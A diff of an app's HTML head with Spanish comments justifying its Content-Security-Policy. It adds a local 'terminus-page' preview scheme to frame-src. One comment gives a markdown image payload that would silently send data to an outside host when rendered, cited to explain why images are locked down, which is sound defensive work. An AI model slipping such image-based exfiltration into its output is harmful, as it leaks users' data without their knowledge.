@@ -13,7 +13,7 @@
          cliente, que no es de confianza. Sin ella, un `![](http://ajeno/?d=…)` en
          la respuesta dispara el GET **al pintarse, sin un clic**, y eso es
          material saliendo de la máquina por una vía que no es ninguna de las
-         cinco de `ARCHITECTURE.md` § 7: sin sello y sin rastro. Medido, y vuelto
+         cinco contratos de red: sin sello y sin rastro. Medido, y vuelto
          a medir después de cerrarlo: `tests/security/window.mjs`.
 
          Cada permiso, y por qué está:
@@ -57,6 +57,9 @@
                                    `sandbox` ni la política del propio documento
                                    alcanzan ese caso: un marco siempre puede
                                    navegarse a sí mismo. Ver `tests/security/README.md`.
+                                   `terminus-page` es la vista previa de un `.html`
+                                   de la tarea (`page_preview.rs`): solo sirve
+                                   archivos de esa carpeta, no lleva a la red.
          · `base-uri` y `form-action` en `'none'`
                                    no heredan de `default-src`, así que quedarían
                                    abiertas. Los cinco formularios de la app llaman
@@ -68,7 +71,7 @@
          sistema. -->
     <meta
       http-equiv="Content-Security-Policy"
-      content="default-src 'self'; script-src 'self'; script-src-elem 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: terminus-image: http://terminus-image.localhost; font-src 'self' data:; media-src 'self' data:; connect-src 'self' ipc: http://ipc.localhost https://computers.danil.ai wss://computers.danil.ai; frame-src 'self'; object-src 'none'; base-uri 'none'; form-action 'none'"
+      content="default-src 'self'; script-src 'self'; script-src-elem 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: terminus-image: http://terminus-image.localhost; font-src 'self' data:; media-src 'self' data:; connect-src 'self' ipc: http://ipc.localhost https://computers.danil.ai wss://computers.danil.ai; frame-src 'self' terminus-page: http://terminus-page.localhost; object-src 'none'; base-uri 'none'; form-action 'none'"
     />
     <title>Danil</title>
   </head>
